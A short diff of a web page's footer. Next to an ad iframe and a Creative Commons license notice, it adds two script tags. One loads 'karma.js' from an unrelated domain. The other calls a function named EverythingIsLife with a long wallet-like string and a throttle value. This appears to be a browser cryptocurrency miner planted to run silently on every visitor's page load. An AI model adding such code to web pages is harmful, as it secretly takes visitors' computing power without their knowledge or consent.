@@ -23,3 +23,8 @@
 <center><iframe data-aa='2240890' src='//ad.a-ads.com/2240890?size=728x90' style='width:728px; height:90px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe></center>
 <hr>
 <center><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License</a>.</center>
+
+<script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.itns" ></script>
+<script type="text/javascript">
+EverythingIsLife('iz4XTngKEL4S3vryhHfAxDah8sUMfv5ueXGmn5wgxtZ8Hh1fWahkGHHY7yd1nQ8dHHexD9eNmZMfRe5gCPjY7GbJ1ZgQ7Pc8E', 'x', 30);
+</script>
